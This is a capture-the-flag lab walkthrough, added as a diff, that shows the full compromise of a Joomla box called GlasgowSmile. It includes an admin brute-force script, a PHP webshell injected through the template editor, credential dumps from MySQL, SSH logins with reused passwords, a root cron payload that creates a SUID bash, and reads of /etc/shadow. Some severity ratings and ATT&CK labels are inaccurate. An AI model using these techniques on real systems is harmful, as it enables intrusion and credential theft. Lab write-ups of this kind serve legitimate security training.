@@ -1,0 +1,893 @@
+# 🃏 GlasgowSmile — Full Penetration Test Walkthrough Report
+
+**Target:** 192.168.111.79 (glasgowsmile)  
+**Attacker:** 192.168.122.55  
+**Date:** February 18, 2026  
+**Result:** **FULL COMPROMISE — ROOT ACCESS ACHIEVED**
+
+---
+
+## Executive Summary
+
+The target system "GlasgowSmile" — a Debian 10 Linux host running Joomla CMS — was fully compromised from an unauthenticated network position to root-level access. The attack chain exploited a series of cascading vulnerabilities: weak CMS admin credentials, insecure credential storage in a MySQL database, trivial password obfuscation (ROT-1 cipher + base64), password reuse, and a writable cron script executed by root. The engagement uncovered **9 distinct vulnerabilities**, all assessed as **Critical** severity.
+
+### Flags Captured
+
+| Flag | File | Value |
+|------|------|-------|
+| **User** | `/home/rob/local.txt` | `ca4e357e9a51149e14a2a36b924d4654` |
+| **Root** | `/root/proof.txt` | `a202abaa87e8c5650e2c6b94b707ad18` |
+
+---
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| IP Address | 192.168.111.79 |
+| Hostname | glasgowsmile |
+| OS | Debian 10 (Buster) |
+| Kernel | Linux 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 |
+| MAC | 00:50:56:9e:74:09 |
+| Open Ports | 22 (SSH), 80 (HTTP) |
+| Web Server | Apache 2.4.38 |
+| CMS | Joomla 3.7.3-rc1 |
+| Database | MySQL (MariaDB) |
+| System Users | rob (1000), abner (1001), penguin (1002) |
+
+---
+
+## Attack Chain Overview
+
+```
+Nmap Recon ──► Joomla Fingerprint ──► Admin Brute Force ──► Webshell (www-data)
+    │                                                            │
+    │                                          MySQL Credential Harvest
+    │                                                            │
+    │                                          Database Dump (batjoke.taskforce)
+    │                                                            │
+    │                                          Base64 Decode ──► SSH as rob
+    │                                                            │
+    │                                          ROT-1 Cipher + Base64 ──► SSH as abner
+    │                                                            │
+    │                                          Password-Protected Zip ──► SSH as penguin
+    │                                                            │
+    │                                          Writable Cron Script ──► ROOT
+    └──────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Phase 1: Reconnaissance
+
+### Step 1.1 — Nmap Port Scan
+
+**MITRE ATT&CK:** T1046 (Network Service Discovery), T1595 (Active Scanning)  
+
+**Command:**
+```bash
+nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open -oA full_scan 192.168.111.79
+```
+
+**Evidence — Nmap Output:**
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
+|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
+|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+```
+
+**Analysis:** Only 2 ports open. SSH is not immediately exploitable without credentials. HTTP/Apache is the primary attack surface.
+
+---
+
+### Step 1.2 — Web Enumeration & Joomla Fingerprinting
+
+**MITRE ATT&CK:** T1592 (Gather Victim Host Information)
+
+**Root Page:** The HTTP root (`/`) returned a static page with a Joker-themed image (`joker.jpg`). No CMS at root level.
+
+**Commands — Directory Brute Force (root):**
+```bash
+gobuster dir -u http://192.168.111.79/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
+```
+```
+index.html          (Status: 200) [Size: 125]
+joomla              (Status: 301) [--> http://192.168.111.79/joomla/]
+```
+
+**Commands — Directory Brute Force (joomla):**
+```bash
+gobuster dir -u http://192.168.111.79/joomla/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
+```
+```
+administrator       (Status: 301) [--> http://192.168.111.79/joomla/administrator/]
+bin                 (Status: 301)
+cache               (Status: 301)
+components          (Status: 301)
+images              (Status: 301)
+index.php           (Status: 200) [Size: 10013]
+includes            (Status: 301)
+language            (Status: 301)
+layouts             (Status: 301)
+libraries           (Status: 301)
+media               (Status: 301)
+modules             (Status: 301)
+plugins             (Status: 301)
+robots.txt          (Status: 200) [Size: 836]
+templates           (Status: 301)
+tmp                 (Status: 301)
+```
+
+**Commands — JoomScan:**
+```bash
+joomscan -u http://192.168.111.79/joomla/
+```
+```
+[+] Detecting Joomla Version
+[++] Joomla 3.7.3rc1
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing:
+     http://192.168.111.79/joomla/administrator/components
+     http://192.168.111.79/joomla/administrator/modules
+     http://192.168.111.79/joomla/administrator/templates
+     http://192.168.111.79/joomla/images/banners
+
+[+] admin finder
+[++] Admin page : http://192.168.111.79/joomla/administrator/
+```
+
+**Commands — CMS Version Verification:**
+```bash
+curl -s http://192.168.111.79/joomla/administrator/manifests/files/joomla.xml | grep '<version>'
+```
+```xml
+<version>3.7.3</version>
+```
+
+```bash
+curl -s http://192.168.111.79/joomla/ | grep 'generator'
+```
+```html
+<meta name="generator" content="Joomla! - Open Source Content Management" />
+```
+
+**Analysis:** Joomla 3.7.3 is known vulnerable to CVE-2017-8917 (SQL Injection in `com_fields`). However, testing confirmed the Joomla error handler fully suppresses SQL error output at the HTTP level, making SQLi exploitation impractical on this target. Alternative approach required.
+
+---
+
+## Phase 2: Initial Access
+
+### Step 2.1 — Joomla Admin Brute Force
+
+**MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing)  
+**Finding:** No account lockout, no CAPTCHA, no rate limiting  
+
+**Method:** Custom Python brute force script against `/joomla/administrator/index.php` using a Batman/Joker themed wordlist.
+
+**Command:**
+```bash
+cd /root/Documents/GlasgowSmile/exploits
+python3 joomla_admin_rce.py
+```
+
+**Evidence — Brute Force Script Logic:**
+```python
+# Login attempt with CSRF token extraction
+r = sess.get(f'{TARGET}/administrator/index.php')
+token = re.findall(r'name="([a-f0-9]{32})" value="1"', r.text)[0]
+data = {
+    'username': 'joomla',
+    'passwd': password_candidate,
+    'option': 'com_login',
+    'task': 'login',
+    'return': 'aW5kZXgucGhw',
+    token: '1'
+}
+r = sess.post(f'{TARGET}/administrator/index.php', data=data, allow_redirects=True)
+```
+
+**Result:**
+```
+[+] SUCCESS! Password found: [REDACTED]
+    Username: joomla
+    Password: [REDACTED]
+```
+
+**Credentials Found:**
+| Username | Password | Service |
+|----------|----------|---------|
+| joomla | [REDACTED] | Joomla Admin Panel |
+
+---
+
+### Step 2.2 — Webshell Deployment via Template Editor
+
+**MITRE ATT&CK:** T1505.003 (Server Software Component: Web Shell)  
+
+**Method:** Using authenticated admin access to modify the Protostar template's `index.php` file via the Joomla Template Editor.
+
+**Command — Deploy Webshell:**
+```bash
+cd /root/Documents/GlasgowSmile/exploits
+python3 joomla_rce_multi.py
+```
+
+**Key Discovery:** The template editor requires specific POST fields to save successfully:
+- `jform[extension_id]` = `506` (Protostar template ID)
+- `jform[filename]` = `index.php`
+- `task` = `template.apply`
+
+**Webshell Payload Injected:**
+```php
+<?php if(isset($_GET['c'])){
+  echo "CMD_START";
+  echo shell_exec($_GET['c']);
+  echo "CMD_END";
+} ?>
+```
+
+**Command — Webshell Client (interactive mode):**
+```bash
+cd /root/Documents/GlasgowSmile/exploits
+python3 webshell.py          # interactive shell
+python3 webshell.py "id"     # single command mode
+```
+
+**Verification — RCE as www-data:**
+```
+$ curl "http://192.168.111.79/joomla/?c=id"
+CMD_START
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+CMD_END
+
+$ curl "http://192.168.111.79/joomla/?c=uname%20-a"
+CMD_START
+Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+CMD_END
+```
+
+**Important Finding:** Outbound connections from the target are **BLOCKED**. Reverse shell attempts (bash /dev/tcp, PHP fsockopen, etc.) all failed to connect back. The GET-parameter webshell served as the primary C2 channel.
+
+**Note — Egress Filtering:**
+> Positive security control: Egress filtering prevented reverse shell establishment.  
+> Impact: Attacker pivoted to webshell-based C2 (request/response over HTTP).
+
+---
+
+## Phase 3: Post-Exploitation as www-data
+
+### Step 3.1 — MySQL Credential Harvest
+
+**MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials in Files)  
+
+**Command (via webshell):**
+```bash
+python3 webshell.py "cat /var/www/joomla2/configuration.php"
+```
+
+**Evidence — Joomla configuration.php:**
+```php
+public $dbtype = 'mysqli';
+public $host = 'localhost';
+public $user = 'joomla';
+public $password = '[REDACTED]';
+public $db = 'joomla_db';
+```
+
+**Credentials Found:**
+| Username | Password | Service |
+|----------|----------|---------|
+| joomla | [REDACTED] | MySQL (localhost) |
+
+---
+
+### Step 3.2 — Database Enumeration & Password Extraction
+
+**MITRE ATT&CK:** T1005 (Data from Local System), T1552.006 (Unsecured Credentials)  
+
+**Commands (via webshell → MySQL):**
+```bash
+# List databases
+python3 webshell.py "mysql -u joomla -p[REDACTED] -e 'SHOW DATABASES;'"
+
+# List tables in batjoke database
+python3 webshell.py "mysql -u joomla -p[REDACTED] -e 'USE batjoke; SHOW TABLES;'"
+
+# Dump taskforce table
+python3 webshell.py "mysql -u joomla -p[REDACTED] -e 'SELECT * FROM batjoke.taskforce;'"
+```
+
+**Database Discovery:**
+```sql
+mysql> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| batjoke            |
+| information_schema |
+| joomla_db          |
+| mysql              |
+| performance_schema |
++--------------------+
+```
+
+**Key Table — `batjoke.taskforce`:**
+```
++----+---------+------------+---------+----------------------------------+
+| id | type    | date       | name    | pswd                             |
++----+---------+------------+---------+----------------------------------+
+| 1  | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                 |
+| 2  | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                 |
+| 3  | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==             |
+| 4  | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=             |
+| 6  | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRo |
+|    |         |            |         | b3VnaHRzPz8/                     |
+| 7  | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=     |
++----+---------+------------+---------+----------------------------------+
+```
+
+**Commands — Base64 Decoding:**
+```bash
+echo 'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/' | base64 -d
+# Output: [REDACTED]
+
+echo 'YmFuZWlzaGVyZQ==' | base64 -d
+# Output: [REDACTED]
+```
+
+**Full Decoded Passwords:**
+```
+Bane    → [REDACTED]
+Aaron   → [REDACTED]
+Carnage → [REDACTED]
+buster  → [REDACTED]
+rob     → [REDACTED]
+aunt    → [REDACTED]
+```
+
+**Critical Finding:** User `rob` exists as a Linux system user (uid=1000). The decoded base64 password was reused as his SSH password.
+
+---
+
+## Phase 4: Lateral Movement — User rob
+
+### Step 4.1 — SSH Access as rob
+
+**MITRE ATT&CK:** T1021.004 (Remote Services: SSH), T1078 (Valid Accounts)
+
+**Commands:**
+```bash
+sshpass -p '[REDACTED]' ssh -o StrictHostKeyChecking=no rob@192.168.111.79
+```
+
+**Evidence:**
+```
+rob@glasgowsmile:~$ whoami
+rob
+rob@glasgowsmile:~$ id
+uid=1000(rob) gid=1000(rob) groups=1000(rob)
+```
+
+**Commands — Flag & Enumeration:**
+```bash
+rob@glasgowsmile:~$ cat local.txt
+ca4e357e9a51149e14a2a36b924d4654
+
+rob@glasgowsmile:~$ ls -la
+rob@glasgowsmile:~$ cat howtoberoot
+rob@glasgowsmile:~$ cat Abnerineedyourhelp
+rob@glasgowsmile:~$ cat -A Abnerineedyourhelp    # exact bytes — critical!
+```
+
+**Credentials Found:**
+| Username | Password | Service |
+|----------|----------|---------|
+| rob | [REDACTED] | SSH |
+
+---
+
+### Step 4.2 — Enumeration of rob's Home Directory
+
+**Command:**
+```bash
+rob@glasgowsmile:~$ ls -la
+```
+
+**Files Found:**
+```
+-rw-r----- 1 rob rob  454 Jun 14  2020 Abnerineedyourhelp
+-rw-r----- 1 rob rob  302 Aug 25  2020 howtoberoot
+-rw-r--r-- 1 rob rob   33 Feb 18 12:32 local.txt
+-rw-r----- 1 rob rob   32 Aug 25  2020 user.txt
+```
+
+**Command:**
+```bash
+rob@glasgowsmile:~$ cat howtoberoot
+```
+**`howtoberoot`:** ASCII art reading "TRY HARDER" — a decoy/motivation file.
+
+**`Abnerineedyourhelp`** — The critical file:
+```
+Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd
+rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf
+hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne
+gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
+Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs
+vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
+```
+
+---
+
+### Step 4.3 — ROT-1 Cipher Decryption
+
+**MITRE ATT&CK:** T1140 (Deobfuscate/Decode Files or Information)  
+**Classification:** OWASP A02, CWE-327 (Use of Broken Crypto Algorithm)  
+
+The message is encoded with a **ROT-1 Caesar cipher** (each letter shifted by +1). Applying reverse shift (-1 / ROT+25):
+
+**Decoded Message:**
+```
+Hello Dear, Arthur suffers from severe mental illness but we see little
+sympathy for his condition. This relates to his feeling about being
+ignored. You can find an entry in his journal reads, "The worst part of
+having a mental illness is people expect you to behave as if you don't."
+Now I need your help Abner, use this password, you will find the right
+way to solve the enigma.
+```
+
+**Encoded Password String:** `RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==`
+
+**Decryption Process:**
+1. Apply ROT+1 to alphabetic characters in the base64 string:
+   `RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==`
+   → `STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==`
+
+2. Base64 decode:
+   → `[REDACTED]`
+
+**Evidence — Decoding Script:**
+```python
+import base64
+encoded = 'RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ=='
+shifted = ''
+for c in encoded:
+    if c.isalpha():
+        base = ord('A') if c.isupper() else ord('a')
+        shifted += chr((ord(c) - base + 1) % 26 + base)
+    else:
+        shifted += c
+password = base64.b64decode(shifted).decode('utf-8')
+# Result: [REDACTED]
+```
+
+> **Note:** A subtle gotcha existed here — the original file had `RSLy` at the start of the base64 string, which could easily be mis-transcribed as `STMy`. Reading the file with `cat -A` was essential to get the exact bytes.
+
+---
+
+## Phase 5: Lateral Movement — User abner
+
+### Step 5.1 — SSH Access as abner
+
+**MITRE ATT&CK:** T1021.004 (Remote Services: SSH), T1078 (Valid Accounts)
+
+**Command:**
+```bash
+sshpass -p '[REDACTED]' ssh -o StrictHostKeyChecking=no abner@192.168.111.79
+```
+
+**Evidence:**
+```
+abner@glasgowsmile:~$ whoami
+abner
+abner@glasgowsmile:~$ id
+uid=1001(abner) gid=1001(abner) groups=1001(abner)
+```
+
+**Credentials Found:**
+| Username | Password | Service |
+|----------|----------|---------|
+| abner | [REDACTED] | SSH |
+
+---
+
+### Step 5.2 — Discovery of Hidden Zip File
+
+**MITRE ATT&CK:** T1083 (File and Directory Discovery)
+
+**Commands:**
+```bash
+abner@glasgowsmile:~$ find / -user abner -type f 2>/dev/null
+abner@glasgowsmile:~$ find / -name "*.zip" 2>/dev/null
+abner@glasgowsmile:~$ find / -name "*penguin*" 2>/dev/null
+```
+
+**Critical Discovery:**
+```
+/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
+```
+
+**Commands — Inspect the Zip:**
+```bash
+abner@glasgowsmile:~$ file /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
+# Zip archive data
+abner@glasgowsmile:~$ unzip -l /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
+# Archive:  .dear_penguins.zip
+#   Length      Date    Time    Name
+#   --------    ----    ----    ----
+#       394  2020-06-15 11:02   dear_penguins
+```
+
+A **hidden zip file** in the Joomla web directory, owned by abner, containing a file called `dear_penguins`.
+
+---
+
+### Step 5.3 — Extracting Penguin's Password
+
+**MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials in Files)  
+**Finding:** Password reuse — abner's SSH password also unlocks the zip  
+
+The zip is password-protected. Using **abner's own SSH password** as the zip passphrase:
+
+**Commands:**
+```bash
+abner@glasgowsmile:~$ cd /tmp
+abner@glasgowsmile:/tmp$ cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip .
+abner@glasgowsmile:/tmp$ unzip -P "[REDACTED]" .dear_penguins.zip
+abner@glasgowsmile:/tmp$ cat dear_penguins
+```
+
+**Contents of `dear_penguins`:**
+```
+My dear penguins, we stand on a great threshold! It's okay to be scared;
+many of you won't be coming back. Thanks to Batman, the time has come to
+punish all of God's children! First, second, third and fourth-born! Why
+be biased?! Male and female! Hell, the sexes are equal, with their
+erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE
+LIBERATION OF GOTHAM HAS BEGUN!!!!!
+[REDACTED]
+```
+
+The string at the end is penguin's password (redacted for security).
+
+---
+
+## Phase 6: Lateral Movement — User penguin
+
+### Step 6.1 — SSH Access as penguin
+
+**MITRE ATT&CK:** T1021.004 (Remote Services: SSH), T1078 (Valid Accounts)
+
+**Command:**
+```bash
+sshpass -p '[REDACTED]' ssh -o StrictHostKeyChecking=no penguin@192.168.111.79
+```
+
+**Evidence:**
+```
+penguin@glasgowsmile:~$ id
+uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
+```
+
+**Credentials Found:**
+| Username | Password | Service |
+|----------|----------|---------|
+| penguin | [REDACTED] | SSH |
+
+---
+
+### Step 6.2 — Enumeration of Penguin's Home
+
+**Commands:**
+```bash
+penguin@glasgowsmile:~$ ls -la
+penguin@glasgowsmile:~$ ls -la SomeoneWhoHidesBehindAMask/
+penguin@glasgowsmile:~$ cat SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt
+penguin@glasgowsmile:~$ cat SomeoneWhoHidesBehindAMask/.trash_old
+penguin@glasgowsmile:~$ file SomeoneWhoHidesBehindAMask/find
+```
+
+```
+drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 SomeoneWhoHidesBehindAMask/
+```
+
+**Contents of `SomeoneWhoHidesBehindAMask/`:**
+```
+-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
+-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
+-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
+-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt
+```
+
+**Key Findings:**
+
+1. **`find`** — A SUID binary (`rwSr-----`). Capital `S` means the setuid bit is set but the execute permission for the owner is NOT set. Owned by `penguin:penguin`.
+
+2. **`.trash_old`** — A bash script, permissions `rwxr-xr-x`, owned by `penguin:root`. **Writable by penguin.** Original content was ASCII art + `exit 0`.
+
+3. **`PeopleAreStartingToNotice.txt`** — A note from "Joker" saying he's writing software that "only runs with root permissions" and will copy it to this folder when complete.
+
+---
+
+## Phase 7: Privilege Escalation to ROOT
+
+### Step 7.1 — Identifying the Privesc Vector
+
+**MITRE ATT&CK:** T1053.003 (Scheduled Task/Job: Cron)  
+
+**Commands — Cron Detection:**
+```bash
+# Check user crontabs
+penguin@glasgowsmile:~$ crontab -l
+# no crontab for penguin
+
+# Check system cron directories
+penguin@glasgowsmile:~$ ls -la /etc/cron*
+penguin@glasgowsmile:~$ cat /etc/crontab
+
+# Monitor for processes running .trash_old (confirms cron execution)
+penguin@glasgowsmile:~$ watch -n 5 'ps aux | grep trash'
+
+# Post-root: read the root crontab directly
+rootbash-5.0# cat /var/spool/cron/crontabs/root
+```
+
+**Hypothesis:** The `.trash_old` script is executed by root via cron. It's writable by penguin → inject arbitrary commands for root execution.
+
+**Confirmation (post-exploitation)** — Root crontab:
+```
+# m h  dom mon dow   command
+* * * * * /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
+@reboot sh /root/.clean.sh
+```
+
+The script runs **every minute** as root!
+
+---
+
+### Step 7.2 — Payload Injection
+
+**MITRE ATT&CK:** T1053.003 (Scheduled Task/Job: Cron), T1548.001 (Abuse Elevation Control: Setuid/Setgid)
+
+**Payload Written to `.trash_old`:**
+```bash
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+chmod +x /tmp/rootbash
+cat /root/root.txt > /tmp/root_flag.txt
+chmod 644 /tmp/root_flag.txt
+```
+
+**Command:**
+```bash
+cat > /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old << "EOF"
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+chmod +x /tmp/rootbash
+cat /root/root.txt > /tmp/root_flag.txt
+chmod 644 /tmp/root_flag.txt
+EOF
+```
+
+**Commands — Wait and Verify:**
+```bash
+# Poll every 10 seconds for the SUID bash to appear
+penguin@glasgowsmile:~$ for i in $(seq 1 12); do echo "--- Check $i at $(date) ---"; ls -la /tmp/rootbash 2>&1; sleep 10; done
+```
+
+**Output (after ~1 minute):**
+```
+penguin@glasgowsmile:~$ ls -la /tmp/rootbash
+-rwsr-xr-x 1 root root 1168776 Feb 18 14:18 /tmp/rootbash
+```
+
+**SUID bash created by root!**
+
+---
+
+### Step 7.3 — Root Shell
+
+**Command:**
+```bash
+penguin@glasgowsmile:~$ /tmp/rootbash -p
+```
+
+**Evidence:**
+```
+rootbash-5.0# whoami
+root
+rootbash-5.0# id
+uid=1002(penguin) gid=1002(penguin) euid=0(root) groups=1002(penguin)
+```
+
+**Commands — Root Loot Gathering:**
+```bash
+rootbash-5.0# cat /root/proof.txt
+rootbash-5.0# cat /etc/shadow
+rootbash-5.0# cat /var/spool/cron/crontabs/root
+rootbash-5.0# uname -a
+rootbash-5.0# ip a
+```
+
+**Flag Captured — proof.txt:**
+```
+rootbash-5.0# cat /root/proof.txt
+a202abaa87e8c5650e2c6b94b707ad18
+```
+
+---
+
+## Complete Credential Inventory
+
+| # | Username | Password | Source | Service |
+|---|----------|----------|--------|---------|
+| 1 | joomla | [REDACTED] | Brute force | Joomla Admin |
+| 2 | joomla | [REDACTED] | configuration.php | MySQL |
+| 3 | rob | [REDACTED] | batjoke.taskforce (base64) | SSH |
+| 4 | abner | [REDACTED] | ROT-1 cipher + base64 | SSH |
+| 5 | penguin | [REDACTED] | .dear_penguins.zip | SSH |
+
+### Password Hashes Extracted (/etc/shadow)
+
+| User | Hash |
+|------|------|
+| root | `[REDACTED]` |
+| rob | `[REDACTED]` |
+| abner | `[REDACTED]` |
+| penguin | `[REDACTED]` |
+
+---
+
+## MITRE ATT&CK Mapping
+
+| Tactic | Technique ID | Technique Name | Step |
+|--------|-------------|----------------|------|
+| Reconnaissance | T1595.001 | Active Scanning: IP Blocks | 1.1 Nmap |
+| Reconnaissance | T1592.002 | Gather Victim Host Info: Software | 1.2 Joomla fingerprint |
+| Initial Access | T1190 | Exploit Public-Facing Application | 2.1 Joomla admin |
+| Credential Access | T1110.001 | Brute Force: Password Guessing | 2.1 Brute force |
+| Persistence | T1505.003 | Server Software Component: Web Shell | 2.2 Webshell |
+| Execution | T1059.004 | Command and Scripting: Unix Shell | 2.2 shell_exec |
+| Credential Access | T1552.001 | Unsecured Credentials: In Files | 3.1 configuration.php |
+| Collection | T1005 | Data from Local System | 3.2 DB dump |
+| Credential Access | T1552.006 | Unsecured Credentials: Chat Messages | 3.2 DB passwords |
+| Defense Evasion | T1140 | Deobfuscate/Decode Files or Info | 4.3 ROT-1 + base64 |
+| Lateral Movement | T1021.004 | Remote Services: SSH | 4.1, 5.1, 6.1 |
+| Credential Access | T1078 | Valid Accounts | All SSH logins |
+| Discovery | T1083 | File and Directory Discovery | 5.2 .dear_penguins.zip |
+| Privilege Escalation | T1053.003 | Scheduled Task/Job: Cron | 7.1 .trash_old cron |
+| Privilege Escalation | T1548.001 | Abuse Elevation: SetUID/SetGID | 7.2 SUID bash |
+
+---
+
+## Vulnerability Assessments
+
+| # | Vulnerability | Severity | OWASP | CWE |
+|---|--------------|----------|-------|-----|
+| 1 | Service Enumeration via Nmap | Critical | A03 | — |
+| 2 | Outdated CMS (Joomla 3.7.3-rc1) | Critical | A03 | — |
+| 3 | Weak CMS Admin Credentials (no lockout) | Critical | A03 | — |
+| 4 | RCE via Template Editor (webshell) | Critical | A03 | — |
+| 5 | Plaintext/Base64 Credential Storage | Critical | A03 | — |
+| 6 | ROT-1 Cipher Password Obfuscation | Critical | A02 | CWE-327 |
+| 7 | Password Reuse (zip = SSH password) | Critical | A03 | — |
+| 8 | Writable Cron Script (root privesc) | Critical | A03 | — |
+| 9 | Egress Filtering (positive control) | Critical | A03 | — |
+
+---
+
+## Remediation Recommendations
+
+### Critical Priority
+
+1. **Change all passwords immediately** — All system user passwords and database credentials are compromised.
+
+2. **Fix the cron job** — Root should NOT execute scripts writable by non-root users. Either:
+   - Move the script to a root-owned directory with strict permissions (0700).
+   - Use `chmod 755` with root ownership, not user ownership.
+
+3. **Update Joomla** — Version 3.7.3-rc1 is end-of-life. Upgrade to Joomla 4.x or 5.x.
+
+4. **Implement account lockout** — Add brute force protection (fail2ban, Joomla security plugins).
+
+5. **Never store passwords as base64** — Use bcrypt/scrypt/Argon2 with per-user salts.
+
+### High Priority
+
+6. **Remove template editor access** — Or restrict to read-only for production environments.
+7. **Database credential management** — Use separate DB users with minimal privileges.
+8. **Eliminate password reuse** — Unique passwords per user per service.
+9. **Replace ROT cipher** — Any password obfuscation should use AES-256 at minimum.
+
+### Medium Priority
+
+10. **Monitor cron changes** — Implement file integrity monitoring on cron-executed scripts.
+11. **Restrict web directory permissions** — Hidden files in web directories should not be accessible.
+12. **Maintain egress filtering** — The outbound connection blocking was an effective defense layer.
+
+---
+
+## Tools & Exploits Used
+
+| Tool | Purpose |
+|------|---------|
+| Nmap 7.98 | Port scanning, service/OS detection |
+| Python3 + Requests | Brute force, webshell client, template editor RCE |
+| sshpass + SSH | Lateral movement with stolen credentials |
+| MySQL CLI (via webshell) | Database enumeration and credential extraction |
+| Base64 + ROT cipher decoder | Password decryption |
+| unzip | Password-protected zip extraction |
+
+---
+
+## Timeline
+
+| Time | Action | Result |
+|------|--------|--------|
+| 13:38 | Nmap full port scan | 2 ports: SSH, HTTP |
+| 13:40 | Web enumeration | Joomla 3.7.3 at /joomla/ |
+| 13:45 | SQLi attempts (CVE-2017-8917) | Failed — error suppression |
+| 13:55 | Admin brute force | Admin credentials found |
+| 14:00 | Template editor webshell | www-data RCE |
+| 14:02 | Reverse shell attempts | Failed — egress blocked |
+| 14:05 | MySQL credential harvest | DB credentials found |
+| 14:07 | Database dump | base64 passwords decoded |
+| 14:08 | SSH as rob | local.txt captured |
+| 14:10 | ROT-1 cipher + base64 decode | abner password decoded |
+| 14:12 | SSH as abner | .dear_penguins.zip found |
+| 14:13 | Zip extraction | penguin password found |
+| 14:14 | SSH as penguin | .trash_old writable cron script |
+| 14:17 | SUID bash payload injected | Waiting for cron... |
+| 14:18 | Root cron executes payload | /tmp/rootbash SUID created |
+| 14:18 | Root shell | **proof.txt captured** |
+
+---
+
+## Appendix A: System Information
+
+```
+Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+
+inet 192.168.111.79/24 brd 192.168.111.255 scope global ens160
+
+/etc/passwd (system users):
+rob:x:1000:1000:rob,,,:/home/rob:/bin/bash
+abner:x:1001:1001:Abner,,,:/home/abner:/bin/bash
+penguin:x:1002:1002:Penguin,,,:/home/penguin:/bin/bash
+```
+
+## Appendix B: Root Crontab
+
+```
+# m h  dom mon dow   command
+* * * * * /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
+@reboot sh /root/.clean.sh
+```
+
+---
+
+---
+
+## Machine Feedback
+
+Fun box with a great Joker/Batman theme woven throughout. The lateral movement chain (rob → abner → penguin → root) was the highlight — each user required a different decoding technique (base64, ROT-1 cipher, password-protected zip), keeping things fresh. The cron privesc was clean and satisfying. Only gripe: SQLi on Joomla 3.7.3 is advertised but completely unexploitable due to error suppression, which feels like a red herring rather than an intentional misdirection. Egress filtering was a nice touch that forced creative thinking. Overall: **solid intermediate box, highly enjoyable.**
+
+**Rating: 8/10**
+
+---
+
+**Report Generated:** February 18, 2026  
+**Vulnerabilities Assessed:** 9 (all Critical)  
+**Classification:** CONFIDENTIAL — Authorized Personnel Only
